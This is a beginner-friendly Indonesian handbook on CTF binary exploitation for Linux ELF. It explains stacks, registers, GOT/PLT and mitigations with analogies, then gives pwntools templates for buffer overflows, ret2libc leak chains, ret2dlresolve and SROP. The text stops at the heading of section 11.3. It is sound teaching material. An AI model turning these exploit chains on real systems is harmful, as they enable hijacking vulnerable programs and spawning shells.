# PWN Handbook — Edisi Lengkap + Pemula Friendly

Panduan ini ditulis sebagai playbook operasional untuk solve challenge pwn, terutama userland Linux/ELF di CTF. **Tiap istilah asing dijelaskan dengan analogi kehidupan sehari-hari**, biar pemula sekalipun bisa ngikutin tanpa bingung.

Fokusnya bukan teori akademis, tapi alur keputusan:

- kondisi apa yang sedang kamu hadapi,
- primitive apa yang sebenarnya kamu punya,
- mitigasi apa yang aktif,
- leak apa yang dibutuhkan,
- dan exploit seperti apa yang paling murah dan paling realistis.

---

## 0. DASAR-DASAR YANG WAJIB DI PAHAM SEBELUM BERMAIN PWN

Sebelum ngomongin exploit, kamu HARUS paham gimana komputer menjalankan program di level paling rendah. Bagian ini menjelaskan semuanya dengan analogi biar gak abstrak.

---

### 0.1 Bit, Byte, Word, DWord, QWord

Ini satuan ukuran data di level CPU.

| Nama | Ukuran | Analogi |
|------|--------|---------|
| **Bit** | 0 atau 1 | Saklar lampu — ON/OFF |
| **Byte** | 8 bit | 1 kotak kecil di gudang, cukup buat 1 huruf ASCII (A=65) |
| **Word** | 2 byte (16 bit) | 2 kotak bersebelahan |
| **DWord** | 4 byte (32 bit) | 4 kotak — ukuran register di i386 |
| **QWord** | 8 byte (64 bit) | 8 kotak — ukuran register di amd64 |

**Kenapa penting?** Waktu kamu ngirim payload, kamu perlu tahu:
- `p8(0x41)` = tulis 1 byte
- `p16(0x4141)` = tulis 2 byte (word)
- `p32(0x41414141)` = tulis 4 byte (dword)
- `p64(0x4141414141414141)` = tulis 8 byte (qword) — ini paling sering di amd64

---

### 0.2 Little Endian — Cara CPU Baca Angka Terbalik

**Bayangkan begini:** Kamu nulis nomor telepon 0812-3456-7890. Tapi buku telepon kamu bacanya dari digit terakhir dulu: 0987-6543-2180. Itu endianness.

**Little Endian** (x86/x64): byte paling kecil (least significant) disimpan di alamat paling rendah.

Contoh: angka `0x12345678` di little endian:
```
Alamat:    [0x00] [0x01] [0x02] [0x03]
Isi:       [0x78] [0x56] [0x34] [0x12]
```

Itulah kenapa waktu kamu leak alamat dari memory mentah, kamu harus `u64(data)` biar pwntools:
- ambil 8 byte mentah
- balik urutannya sesuai little endian
- jadiin alamat yang benar

**Big Endian** (kebalikan — jarang dipake di x86):
```
[0x12] [0x34] [0x56] [0x78]
```

---

### 0.3 Register: Meja Kerja CPU

CPU punya tempat penyimpanan super-cepet yang disebut **register**. Ukurannya 64 bit di amd64 (8 byte).

**Bayangkan begini:** Register itu kayak meja kerja kamu. CPU punya beberapa meja:
- Beberapa meja punya fungsi khusus (tugas tertentu)
- Beberapa meja bisa kamu pake bebas

Register utama yang WAJIB kamu hafal:

| Register | Nama Lengkap | Fungsi | Analogi |
|----------|-------------|--------|---------|
| **RIP** | Instruction Pointer | Nunjukin baris kode mana yang lagi dijalanin | Kayak jarum pemutar lagu di vinyl |
| **RSP** | Stack Pointer | Nunjukin puncak stack (tumpukan) | Kayak tusukan sate — tau ujung tumpukan |
| **RBP** | Base Pointer | Nunjukin dasar stack frame function sekarang | Batas bawah "meja" function |
| **RAX** | Accumulator | Nyimpen hasil return function | Kotak hasil — kalo function selesai, hasilnya di sini |
| **RBX** | Base (general) | Bisa dipake bebas | Meja cadangan |
| **RCX** | Counter | Buat loop/operasi hitung | Counter |
| **RDX** | Data | Argumen ke-3 function | Meja ke-3 |
| **RSI** | Source Index | Argumen ke-2 function | Meja ke-2 |
| **RDI** | Destination Index | Argumen PERTAMA function | **Meja ke-1 — paling penting!** |
| **R8-R15** | Extended | Argumen ke-5 sampai lanjutan | Meja tambahan |

**Catatan: RSP sangat krusial.** Kalo kamu bisa kontrol RSP (stack pivot), kamu bisa nguasain program sepenuhnya. Kalo RIP kamu kontrol, kamu bisa pindahin eksekusi ke mana aja.

---

### 0.4 Memory Layout: Peta Rumah Program

Program yang lagi jalan (process) punya peta memory kayak gini (dari alamat rendah ke tinggi):

```
0x0000 |======================|
       |  .text (Kode Program) | <- Kode yang bisa dieksekusi, biasanya READ-only
       |  .rodata              | <- Data constant (string literal, dll)
       |----------------------|
       |  .data                | <- Data global yang bisa diubah
       |  .bss                 | <- Data global yang belum diisi (zero-initialized)
       |----------------------|
       |  HEAP                 | <- Gudang — memory yang di-minta pas jalan (malloc)
       |     ↓ (tumbuh ke atas)|
       |----------------------|
       |  ↓↓↓↓↓↓              |
       |  (memory kosong)      |
       |  ↑↑↑↑↑↑              |
       |----------------------|
       |  STACK                | <- Tumpukan piring — buat local variable, return address
       |     ↑ (tumbuh ke bawah)|
       |======================|
0xFFFF |  Kernel Space         | <- Gak bisa di akses dari user mode
```

**Kenapa stack tumbuh ke bawah?** Alamat tinggi ke rendah. Bayangin tumpukan piring: piring pertama di dasar (alamat tinggi), piring baru ditaruh di atas (alamat lebih rendah).

**Kenapa ini penting buat PWN?**
- **Stack overflow**: Nulis ke stack melebihi batas buffer → numpuk data di atasnya (termasuk return address)
- **Heap**: Manage memory dinamis — rawan UAF, double free, overflow
- **.text**: Kalo NX aktif, gak bisa jalanin shellcode di stack. Tapi bisa panggil gadget dari .text (ROP)
- **.bss**: Tempat favorit buat nyimpen payload panjang kalau stack sempit (stack pivot)

---

### 0.5 Stack Frame: Cara Function Call Bekerja

Setiap kali program manggil function, CPU bikin **stack frame** — semacam "ruang kerja sementara" buat function itu.

**Bayangkan begini:** Kamu di restoran Padang. Setiap function = 1 piring:
- **Piring pertama (main)**: ditaruh di dasar stack
- **Piring kedua (vuln)**: ditaruh di atas piring pertama
- **Piring ketiga (gets)**: ditaruh di atas piring kedua

Waktu function vuln() selesai, piring vuln() diangkat — balik ke main.
**Waktu piring vuln() diangkat, ternyata posisinya udah ditimpuk — RIP malah nunjuk alamat attacker!** Itulah stack overflow.

Visual stack function amd64:

```
High addr
+---------------------------+ <- RBP (base pointer)
|   Saved RBP               | <- RBP punya function sebelumnya
+---------------------------+
|   Return Address (RIP)    | <- KE SINI target overflow!
+---------------------------+
|   Local variables         | <- Buffer kamu ada di sini
|   (e.g., char buf[64])    |
|   ↓                       |
+---------------------------+ <- RSP (stack pointer) — posisi pas nulis
Low addr
```

Jadi kalo kamu nulis `AAAAAAAA...` ke buffer:

1. Mula-mula nulis di local variable (aman)
2. Terus nulis — kena saved RBP
3. Terus nulis lagi — **kena return address!**
4. Kalo return address kamu ganti, pas function return → RIP loncat ke alamat kamu

---

### 0.6 Calling Convention — Aturan Ngomong ke Function

Setiap arsitektur punya aturan gimana cara ngasih argumen ke function dan gimana dapet return value.

#### amd64 (Linux SysV ABI)

**Function call** (panggil function biasa kayak `system("sh")`):
- Argumen 1: `rdi`
- Argumen 2: `rsi`
- Argumen 3: `rdx`
- Argumen 4: `rcx`
- Argumen 5: `r8`
- Argumen 6: `r9`
- Argumen selanjutnya: stack
- Return value: `rax`

**Syscall** (panggil kernel langsung kayak `open/read/write`):
- Nomor syscall: `rax`
- Argumen 1: `rdi`
- Argumen 2: `rsi`
- Argumen 3: `rdx`
- Argumen 4: `r10`  ← INI BEDA! Di function pake `rcx`, di syscall pake `r10`
- Argumen 5: `r8`
- Argumen 6: `r9`
- Return value: `rax`

**Kenapa bedanya rcx/r10 penting?** Waktu kamu bikin ROP chain, kamu harus tau apakah kamu panggil function (`pop rcx`) atau syscall (`pop r10`). Salah pilih = crash.

#### i386 (32-bit)

Semua argumen lewat stack — didorong (push) dari argumen terakhir ke pertama.

---

### 0.7 Buffer: Wadah Data

**Buffer** = tempat nyimpen data sementara, biasanya array of char.

**Bayangkan begini:** Gelas kosong. Program bilang "isi gelas ini dengan maksimal 8 teguk air". Tapi kalo kamu paksa tuang 16 teguk, airnya tumpah ke meja — ngebasahi barang di sekitarnya.

Itulah **buffer overflow**. Buffer (gelas) cuma muat 8 byte, kamu nulis 16 byte — sisanya numpuk data penting di stack (saved RBP, return address).

Contoh di C:
```c
void vuln() {
    char buf[16];   // gelas 16 teguk
    gets(buf);      // TANPA batas! bisa nulis seberapa aja
}
```

`gets()` gak ngecek panjang input — selalu berbahaya. Fungsi aman: `fgets(buf, size, stdin)` — ngebatesin input sesuai ukuran buffer.

---

### 0.8 Address dan Pointer: Alamat Rumah dan Papan Petunjuk

**Address**: nomor rumah di memory komputer. Setiap byte memory punya alamat unik.

**Bayangkan begini:**
- Memory = kompleks perumahan raksasa
- Setiap rumah punya nomor (address)
- Pointer = papan yang nulis "Rumah Budi ada di Jl. Merpati No. 42"

Di C:
```c
int x = 5;        // x ada di suatu alamat
int *p = &x;      // p = pointer ke x (papan petunjuk)
*p = 10;          // nulis 10 KE alamat yang ditunjuk p
```

Di PWN, pointer adalah inti:
- Kamu nulis alamat ke stack → program loncat ke alamat itu
- Kamu leak pointer → tau di mana letak libc/heap/stack
- Kamu overwrite pointer → program pake nilai yang kamu kontrol

---

### 0.9 Endianness — Alasan Kenapa Alamat Mentah Kelihatan Terbalik

Udah dibahas di 0.2, tapi diulang biar nempel:

Di x86/x64, angka disimpan dengan byte **paling kecil di alamat paling kecil**.

Kalo kamu leak alamat libc dari memory, hasil mentahnya biasanya kayak gini:
```
\x60\x07\x40\x00\x00\x00\x00\x00
```

Itu kalo dibaca sebagai angka = `0x0000000000400760` (setelah di-reverse urutan oleh `u64()`).

**`u64(data)`** = ambil 8 byte, reverse urutan, jadiin integer.
**`p64(addr)`** = ambil integer, balik urutan, jadiin 8 byte.

Dua fungsi ini PALING SERING dipake di PWN.

---

## 1. Mindset Utama — Cara Berpikir Waktu Ngadepin Challenge PWN

**Bayangkan begini:** Kamu detektif yang nemuin mayat (binary crash). Tugas kamu:
1. Cari tau penyebab kematian (bug apa?)
2. Cari tau apa yang bisa kamu lakukan dari situ (primitive apa?)
3. Apa aja penghalangnya (mitigasi?)
4. Informasi apa yang masih kurang (leak apa?)
5. Rencana termurah buat "bunuh balik" (exploit apa?)

PWN hampir selalu bisa diperas jadi **5 pertanyaan**:

1. **Bug apa yang benar-benar ada?** — Stack overflow? Format string? Heap corruption? OOB?
2. **Primitive apa yang bug itu kasih?** — Kamu bisa baca arbitrary? Nulis arbitrary? Kontrol RIP?
3. **Mitigasi apa yang menghalangi jalur paling pendek?** — NX? Canary? PIE? Full RELRO? Seccomp?
4. **Leak apa yang harus didapat dulu?** — Libc base? PIE base? Heap base? Canary?
5. **Setelah kontrol RIP/PC atau heap metadata didapat, chain termurahnya apa?** — ret2libc? ORW? one_gadget? SROP?

**Kesalahan paling umum pemula:**

- ❌ Langsung nembak `one_gadget` tanpa cek constraint — *one_gadget butuh kondisi tertentu, bukan magic bullet*
- ❌ Langsung brute-force tanpa tahu entropy — *berapa bit yang perlu di-tebak? 8 bit? 12 bit? 48 bit?*
- ❌ Langsung ngulik heap padahal bug-nya cukup buat ret2libc — *heap exploit lebih kompleks, jangan kalo gak perlu*
- ❌ Langsung nulis exploit sebelum environment parity beres — *lokal ama remote beda libc = exploit gagal total*
- ❌ Terlalu percaya asumsi lokal padahal remote libc/ld berbeda — *selalu cek versi libc remote!*

---

## 2. Scope dan Prioritas

Default handbook ini menganggap:

- target mayoritas Linux ELF,
- arsitektur umum `amd64` atau `i386`,
- libc glibc,
- tooling: `pwntools`, `gdb`, `pwndbg`/`GEF`, `checksec`, `readelf`, `objdump`, `ROPgadget`, `one_gadget`, `seccomp-tools`, `patchelf`.

Kalau target non-native:
- `qemu-user` sering jadi temanmu,
- pastikan endianness, ABI, dan calling convention benar.

---

## 3. Quick Decision Tree — Pohon Keputusan Cepat

### Kalau challenge terlihat sangat mudah
- cek `file`, `checksec`, `strings`, `symbols`
- cari `win` function (function yang kasih shell/flag)
- coba `ret2win`, `ret2plt`, atau leak sederhana

### Kalau ada stack overflow tanpa NX
- **shellcode paling murah** — tulis shellcode, lompat ke shellcode
- kalau ada seccomp, pikirkan `ORW` atau syscall yang diizinkan

### Kalau ada stack overflow dengan NX
- cari leak (libc / PIE / canary)
- lanjut ke `ret2libc`, `ROP`, `ret2syscall`, `ret2csu`, `ret2dlresolve`, atau `SROP`

### Kalau ada format string
- cari offset (posisi input kamu di stack printf)
- leak stack, libc, PIE, canary, GOT — **semua bisa dari 1 bug!**
- kalau bisa write (%n), pilih target tulis termurah

### Kalau ada heap bug
- identifikasi glibc era (versi berapa? ada tcache? safe-linking?)
- cek primitive: UAF, double free, overflow, off-by-null, arbitrary free
- tentukan target paling murah: leak libc, leak heap, tcache poisoning, unsorted bin, hook overwrite, FSOP, exit handlers, vtable

### Kalau ada seccomp
- dump filternya
- cari syscall yang masih boleh
- paling umum: `open/read/write`, `openat/read/write`, atau `mprotect` masih hidup

### Kalau remote beda dengan lokal
- pastikan libc, ld, dan environment parity dulu
- **jangan lanjut tuning exploit sebelum parity cukup baik**

---

## 4. Setup Awal — Command Pertama yang Wajib Dijalankan

```bash
file ./chall
checksec --file=./chall
readelf -h ./chall
readelf -l ./chall
readelf -s ./chall | less
objdump -d ./chall | less
strings -a ./chall | less
ldd ./chall
```

Alternatif `checksec` modern:
```bash
checksec file ./chall
```

**Dokumentasi checksec** terbaru menunjukkan output fokus pada:

| Mitigasi | Arti Singkat | Analogi |
|----------|-------------|---------|
| `RELRO` | Proteksi GOT (bisa partial/full) | Buku telepon — partial = bisa diedit, full = dikunci |
| `Canary` | Nilai anti-overflow di stack | Segel pintu — kalo rusak, alarm bunyi |
| `NX` | Stack/heap gak bisa dieksekusi | "Dilarang mengeksekusi di gudang" |
| `PIE` | Alamat binary diacak tiap run | Alamat rumah diubah tiap kamu bangun tidur |
| `RPATH` | Path library custom di binary | Jalan khusus ke perpustakaan |
| `RUNPATH` | Sama kayak RPATH, prioritas lebih rendah | Jalur alternatif ke perpustakaan |
| `FORTIFY` | Deteksi overflow pd function tertentu | Security guard di pintu tertentu aja |
| `Symbols` | Nama function masih keliatan/di-strip | Name tag — kalo di-strip, kamu gak tau isi rumahnya |

---

## 5. Apa Arti Mitigasi — Lengkap dengan Analogi

### `No PIE` — Binary gak di-acak

**Analogi:** Rumah kamu alamatnya selalu tetap — Jl. Mawar No. 1. Kamu tau persis di mana letak pintu, jendela, kamar. Gampang di-incer.

**Dampak exploit:**
- binary base statis — alamat binary selalu sama
- gadget dan symbol binary stabil — gak perlu di-leak
- sangat enak untuk `ret2win`, `ROP`, `ret2plt`
- Kamu tau persis alamat `system@plt`, `puts@plt`, `pop rdi; ret` — gak perlu leak dulu

### `PIE enabled` — Binary di-acak

**Analogi:** Rumah kamu dipindahin tiap malem. Tiap bangun tidur, alamatnya beda lagi. Kamu gak bisa hafalan.

**Dampak exploit:**
- binary base randomized — acak tiap jalan
- butuh leak code pointer atau partial overwrite/other bypass
- Kamu harus cari tau dulu binary base, baru bisa pake gadget dalam binary

### `NX enabled` — Memory data gak bisa dieksekusi

**Analogi:** Kamu boleh taruh barang di gudang (stack/heap), tapi gak boleh jalanin acara di gudang itu. Kode cuma bisa dijalankan di ruang tamu (.text).

**Dampak exploit:**
- stack/heap tidak executable
- shellcode mentah biasanya gagal (kecuali kamu pake mprotect dulu)
- pikirkan `ROP`, `ret2libc`, `ret2syscall`, `SROP`, `mprotect`

### `Canary found` — Ada segel anti overflow

**Analogi:** Sebelum pulang kantor, kamu cek segel di pintu. Kalo segel rusak, alarm bunyi kenceng dan program mati.

**Dampak exploit:**
- overflow stack klasik butuh canary leak atau bypass non-return path
- cari format string, OOB read, uninitialized stack leak
- Bisa juga bypass lewat overwrite function pointer NON-stack (heap, vtable, dll)

### `Partial RELRO` — GOT masih bisa ditulis

**Analogi:** Buku telepon. Kamu bisa nulis ulang nomor di buku telepon. Kalo kamu ganti nomor "Pizza Hut" jadi nomor kamu, waktu temen kamu telpon Pizza Hut, malah nyambung ke kamu.

**Dampak exploit:**
- GOT biasanya masih writable
- GOT overwrite sering masih mungkin
- **Ini target termurah!**

### `Full RELRO` — GOT udah dikunci

**Analogi:** Buku telepon udah di-laminating dan digembok. Gak bisa diganti nomornya.

**Dampak exploit:**
- GOT overwrite biasanya mati
- cari target lain: saved RIP, hook, vtable, `.fini_array`, exit handlers, heap metadata, FILE structure, ROP only

### `FORTIFY` — Ada security di beberapa function

**Analogi:** Beberapa pintu rumah ada security guard-nya. Tapi gak semua pintu.

**Dampak exploit:**
- kadang bug jadi lebih keras dieksploitasi, tapi bukan berarti tidak bisa
- lihat call-site nyata, jangan overestimate FORTIFY

### `Seccomp` — Ada aturan syscall yang dibolehin

**Analogi:** Kamu di penjara. Kamu boleh minta barang tertentu aja (syscall tertentu). Gak boleh minta pisau (execve).

**Dampak exploit:**
- exploit chain harus menyesuaikan syscall whitelist/blacklist
- **jangan auto-`system("/bin/sh")`** kalau seccomp memblokir `execve`
- Biasanya masih bisa `open/read/write` (ORW)

---

## 6. Triage 60 Detik — Assessment Cepat

Dalam satu menit pertama, targetmu adalah mengisi tabel mental ini:

- **arsitektur**: `i386`, `amd64`, `aarch64`, `arm`, `mips`, dll
- **static vs dynamic**: Binary statis (semua udah digabung) atau dinamis (pake shared library)?
- **symbol ada atau stripped**: Nama function masih keliatan? Atau dihapus (stripped)?
- **mitigasi**: checksec output
- **input path**: `scanf`, `gets`, `fgets`, `read`, `printf`, `malloc`, parser custom
- **output path**: Ada echo? Ada format string? Ada menu? Ada crash?
- **target goal**: Shell, ORW (print flag), control flow hijack, atau apa?

---

## 7. Tooling Inti + Penjelasan

### pwntools — Swiss Army Knife PWN

Framework Python buat exploit development. Paling penting dan paling sering dipake.

Pakai untuk:
- proses lokal dan remote (`process()`, `remote()`)
- packing/unpacking (`p64()`, `u64()`, `p32()`, `u32()`)
- ELF symbol parsing (`ELF('./chall')`)
- ROP (`ROP(exe)`)
- fmtstr helper (`FmtStr`, `fmtstr_payload`)
- shellcraft (`shellcraft.sh()`, `shellcraft.open()`)
- sigreturn frame (`SigreturnFrame()`)

### pwndbg — GDB dengan Bumbu PWN

Plugin GDB yang nambah command-command spesifik PWN.

Pakai untuk:
- `checksec`
- `cyclic` dan `cyclic -l` (cari offset)
- `telescope` (lihat stack dalam bentuk rapi)
- `vmmap` (lihat peta memory)
- `canary` (cek canary value)
- `piebase` (cari base address PIE)
- `libcinfo` (info libc)
- heap commands: `bins`, `tcachebins`, `unsortedbin`, `fastbins`, `vis-heap-chunks`

### GEF — Alternatif pwndbg

Plugin GDB lain yang mirip pwndbg.

Pakai untuk:
- debugging umum
- multi-arch convenience
- heap introspection
- helper seperti `heap-analysis-helper`

### angr — Symbolic Execution

**Bayangkan begini:** Kamu punya labirin (binary). Daripada kamu jalan sendiri, kamu pake drone yang bisa ngecek SEMUA jalur sekaligus — "jalan mana aja yang bisa nyampe tujuan?"

Pakai saat:
- constraint input rumit (banyak validasi/kondisi)
- validasi cabang terlalu banyak
- crackme/reverse-heavy binary
- kadang sebagai assistant untuk reachability, bukan untuk full exploit

**Jangan default ke angr** kalau bug-nya jelas dan exploit manual lebih cepat. angr berat dan lambat.

### libc-database / libc.rip

**Bayangkan begini:** Kamu nemu sidik jari (alamat puts=0x7f...123). Kamu pengen tau orangnya siapa (libc versi berapa). Kamu cocokin sidik jari ke database.

Pakai saat:
- punya leak libc parsial
- perlu identifikasi libc versi remote

### seccomp-tools

**Bayangkan begini:** Kamu pengen tau aturan penjara — "kamu boleh pake sendok (read), garpu (write), pisau mentega (open). Tapi gak boleh pake golok (execve)."

Pakai saat:
- target memakai seccomp
- kamu perlu tahu syscall mana yang masih mungkin

---

## 8. Pwntools Skeleton Wajib

Ini template minimal yang harus kamu hafal di luar kepala:

```python
from pwn import *

exe = context.binary = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

context.log_level = 'info'
context.terminal = ['tmux', 'splitw', '-h']

HOST = 'host'
PORT = 1337

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript)
    return process([exe.path])

gdbscript = '''
set follow-fork-mode parent
continue
'''

io = start()

io.interactive()
```

**Kenapa template ini penting?**
- `context.binary = ELF(...)` — pwntools otomatis tau arsitektur, bit, endianness
- `start()` — kamu bisa ganti mode pake argumen: `python exploit.py`, `python exploit.py REMOTE`, `python exploit.py GDB`
- `patchelf` bikin exploit lokal lebih jujur parity sama remote

Kalau remote libc/ld disediakan, buat parity lokal:
```bash
cp chall chall_patched
patchelf --set-interpreter ./ld-linux-x86-64.so.2 chall_patched
patchelf --set-rpath . chall_patched
```

Catatan: selalu simpan copy binary asli. `patchelf` modify binarynya.

---

## 9. Workflow Standar Saat Tidak Tahu Harus Mulai Dari Mana

1. `file` — tau jenis binary
2. `checksec` — tau mitigasi
3. jalankan binary dan lihat menu/input — pahami interaksi
4. cari crash pakai input besar — testing batas
5. cek symbol / strings / imported funcs — apa aja yang bisa dipanggil
6. buka di disassembler atau decompiler — lihat kode asli
7. cari bug class — stack overflow? format string? integer bug?
8. buat PoC lokal kecil — verifikasi primitive
9. baru naik ke exploit penuh

**Kalau masih blur, tanya: apakah ini corruption challenge atau constraint challenge?**

### Corruption challenge
- stack overflow — numpuk memory
- format string — baca/tulis memory lewat printf
- heap — korupsi metadata gudang
- OOB — baca/tulis di luar batas array

### Constraint challenge
- parser — program parsing input, exploit lewat format khusus
- VM — binary punya virtual machine sendiri
- arithmetic — bug matematika
- obfuscated checks — kode rumit, butuh symbolic execution

---

## 9A. PLT, GOT, dan Lazy Binding — Penjelasan SUPER Lengkap untuk Pemula

**Ini adalah konsep PALING PENTING buat ret2libc dan ROP. Pahami betul-betul.**

### Analogi Besar: Restoran Padang

**Bayangkan begini:** Kamu pergi ke restoran Padang. Ada 3 hal:
1. **Menu (PLT)** — daftar nama makanan yang tersedia. Kamu lihat "Rendang" di menu.
2. **Dapur (Library/libc)** — tempat makanan beneran dimasak.
3. **Nomor Meja (GOT)** — koki kasih kamu nomor meja. Pas kamu panggil "Rendang" lagi, kamu tinggal inget nomor mejanya, gak usah nanya dari awal.

Skenario:
- Pertama kali kamu pesan "Rendang", pelayan harus lari ke dapur, tanya koki, baru bawa makanan. **(Lazy binding — resolve pertama lambat)**
- Kedua kali kamu pesan "Rendang", pelayan udah tau nomor mejanya — langsung ambil. **(GOT udah diisi — lebih cepet)**

### Technical Explanation

**PLT** = Procedure Linkage Table. Isinya stub (kode kecil) yang manggil dynamic linker buat nyari alamat function di libc. Begitu dapet, alamatnya disimpen di GOT.

**GOT** = Global Offset Table. Isinya alamat ACTUAL function di libc. Awalnya masih kosong (nunjuk ke PLT lagi). Setelah function dipanggil pertama kali, GOT diisi alamat real.

**Lazy binding** = Symbol tertentu baru di-resolve (dicari alamatnya) saat pertama dipanggil. Biar startup program cepet.

### Visual GOT Resolution

```
Pertama kali puts() dipanggil:
  main → calls puts@PLT → jumps ke *GOT[puts] → GOT masih kosong → balik ke PLT
       → PLT panggil dynamic linker → cari alamat puts di libc
       → isi GOT[puts] = alamat real puts di libc
       → jalankan puts()

Kedua kali puts() dipanggil:
  main → calls puts@PLT → jumps ke *GOT[puts] → GOT UDAH TERISI → langsung ke puts di libc
```

### Implikasi Praktis buat Exploit

1. **`puts@plt(exe.got['puts'])`** adalah leak klasik di amd64. Kenapa?
   - `puts@plt` = cara manggil function puts. Kamu tau alamatnya (kalo No PIE).
   - `exe.got['puts']` = alamat di GOT yang isinya pointer ke puts di libc.
   - Jadi: **print isi dari GOT[puts], yang mana itu alamat libc!**
   - Dari leak itu kamu hitung libc base, lalu kamu tau alamat `system`, `/bin/sh`, `execve`, dll.

2. **`Partial RELRO`** = GOT masih writable. Kamu bisa overwrite GOT[puts] dengan alamat `system`. Besoknya kalo program panggil `puts("sh")`, yang jalan malah `system("sh")`.

3. **`Full RELRO`** = GOT udah di-protect (read-only setelah startup). Gak bisa di-overwrite.

Command yang sering dipakai:
```bash
readelf -r ./chall   # lihat relocation table
objdump -R ./chall   # lihat GOT entries
```

### Ringkasan Istilah

| Istilah | Arti | Analogi |
|---------|------|---------|
| PLT | Stub function di binary | Menu restoran |
| GOT | Tabel alamat fungsi real | Nomor meja koki |
| Lazy Binding | Resolve pas pertama dipanggil | Nanya dulu ke koki pas pesan pertama |
| Dynamic Linker | Program yang nyariin alamat di libc | Pelayan yang lari ke dapur |
| Partial RELRO | GOT bisa diubah | Nomor meja bisa diedit |
| Full RELRO | GOT dikunci | Nomor meja di-laminating |

---

## 10. Stack Overflow — Penjelasan Paling Dasar

**Analogi Besar:** Kamu punya gelas (buffer) di atas meja (stack). Di sebelah gelas ada surat penting (return address). Kamu tuang air terus ke gelas yang udah penuh — airnya tumpah ke meja dan ngebasahi surat penting itu. Kalo kamu ganti suratnya dengan surat palsu, programnya bakal ngikutin surat palsu itu.

### 10.1 Identifikasi offset — Cari Tahu Berapa Banyak Input Sampai Kena RIP

Gunakan cyclic pattern — string unik yang gak berulang:

```bash
pwn cyclic 200        # generate 200 byte unique pattern
```

Kirim pattern ke program. Pas crash, lihat nilai RIP di GDB:

```bash
pwn cyclic -l 0x61616169   # cari offset dari nilai RIP
```

Di pwndbg langsung:
```gdb
cyclic 200             # generate pattern
r                      # run (kirim pattern)
# program crash, catat RIP value
cyclic -l $rax         # atau cari offset dari register yang ter-overwrite
```

### 10.2 Kapan `ret2win` — Langsung ke Function Menang

**Analogi:** Kamu tau ada pintu rahasia yang langsung ke brankas. Kamu tinggal buka pintu itu. Gak perlu ribet.

Pakai saat:
- ada function `win`, `shell`, `flag`, `system_wrapper`, dll (function yang ngasih shell atau baca flag)
- offset RIP sudah diketahui
- tidak perlu leak (kalo No PIE, alamat function udah fixed)

Template:
```python
offset = 40   # hasil cyclic
payload  = b'A' * offset
payload += p64(exe.symbols['win'])   # langsung lompat ke win
```

### 10.3 Kapan `ret2libc` — Panggil Function di Libc

**Analogi:** Kamu gak punya kunci brankas (gak ada win function). Tapi kamu bisa nelpon "tukang kunci" (libc). Masalahnya, kamu harus tau dulu nomor telponnya (leak libc base).

Pakai saat:
- NX aktif (stack gak bisa dieksekusi)
- kamu bisa panggil `puts`/`printf`/`write` untuk leak
- lalu balik ke `main` atau loop

Flow standar:
1. leak libc address (panggil puts(GOT[puts]))
2. hitung libc base
3. panggil `system("/bin/sh")` atau ORW chain

### 10.4 Kapan `ret2syscall` — Panggil Kernel Langsung

**Analogi:** Daripada nelpon resepsionis (libc function), kamu langsung teriak ke kernel (syscall). Gak perlu libc sama sekali.

Pakai saat:
- gadget cukup (pop rax; pop rdi; pop rsi; pop rdx; syscall)
- seccomp atau libc membuat `system` jelek
- target statically linked atau libc susah

### 10.5 Kapan `ret2csu` — Saat Gadget Register Sulit

Khusus amd64 ELF. Binary sering punya `__libc_csu_init` yang punya gadget bagus.

**Analogi:** Kamu lagi di IKEA dan gak nemu obeng. Ternyata ada pisau lipat multifungsi di laci dapur (`__libc_csu_init`) yang bisa ngerjain banyak hal.

Pakai saat:
- `pop rdx` atau register lain sulit dicari
- binary cukup kecil dan gak punya gadget lengkap
- binary punya `__libc_csu_init` sequence

### 10.6 Kapan `ret2dlresolve` — Paksa Linker Cari Symbol Baru

**Analogi:** Kamu minta pelayan nyariin menu yang TIDAK ADA di daftar menu, tapi ada di dapur. Pelayan lari ke dapur, cek bahan, dan bikin makanan itu dari awal.

Pakai saat:
- dynamic binary
- symbol target tidak ter-import (misal `system` gak ada di PLT)
- kamu bisa kontrol stack/memory cukup untuk fake structures
- `system` atau `execve` ingin dipanggil lewat dynamic linker

Pwntools punya helper:
```python
from pwn import *
payload = Ret2dlresolvePayload(exe, symbol='system', args=['/bin/sh'])
```

**Tapi**: ini agak advanced. Jangan jadi pilihan pertama kalo ret2libc masih memungkinkan.

### 10.7 Kapan `SROP` — Sigreturn-Oriented Programming

**Analogi:** Kamu bikin formulir palsu (fake signal frame) yang isinya "saya ini raja, semua register saya set ini". Waktu kamu kirim formulir ke kernel, kernel percaya — dan semua register berubah sesuai keinginan kamu.

Pakai saat:
- gadget register kurang (gak punya pop rdi, pop rsi, pop rdx yang lengkap)
- ada `syscall; ret` atau `int 0x80`
- kamu bisa mengatur `rax/eax` ke `sigreturn` (angka 15 di amd64, 119 di i386)
- perlu kontrol syscall state penuh

Pwntools bisa bikin `SigreturnFrame`:
```python
frame = SigreturnFrame()
frame.rax = constants.SYS_read   # syscall number
frame.rdi = 0                     # fd
frame.rsi = heap_addr             # buf
frame.rdx = 0x100                 # size
frame.rsp = stack_addr            # stack baru
frame.rip = syscall_ret           # ke syscall
```

---

## 11. ret2libc Playbook — Panduan Lengkap

### 11.1 Leak target paling umum

Yang paling sering di-leak (bocorin alamatnya):

- `puts@got` — karena `puts` hampir selalu ada
- `printf@got` — kalo program banyak pake printf
- `read@got` — kalo program pake read
- `__libc_start_main` — pointer yang nyisa di stack dari startup program
- return address ke libc — return address dari function yang dipanggil library

### 11.2 Flow umum amd64 — Step by Step

1. Kontrol RIP (stack overflow atau bug lain)
2. Cari `pop rdi; ret` gadget (biar bisa set argumen pertama)
3. Set `rdi` ke alamat GOT entry (misal: alamat GOT[puts])
4. Panggil `puts@plt` — puts nge-print 8 byte isi GOT[puts], yaitu alamat libc puts
5. Balik ke `main` — biar program gak crash dan kamu bisa kirim payload kedua
6. Parse leak — baca 8 byte yang di-print, balik urutannya (little endian!)
7. Hitung libc base — `leaked_puts - libc.symbols['puts']`
8. Chain kedua ke `system("/bin/sh")` atau ORW

Template leak:
```python
rop = ROP(exe)
payload  = b'A' * offset
payload += p64(rop.find_gadget(['ret'])[0])        # stack alignment (11.3)
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(exe.got['puts'])                     # arg: alamat GOT[puts]
payload += p64(exe.plt['puts'])                     # call puts → print leak
payload += p64(exe.symbols['main'])                 # balik ke main buat stage 2
```

### 11.3 Stack Alignment amd64 — Kenapa Kadang Crash

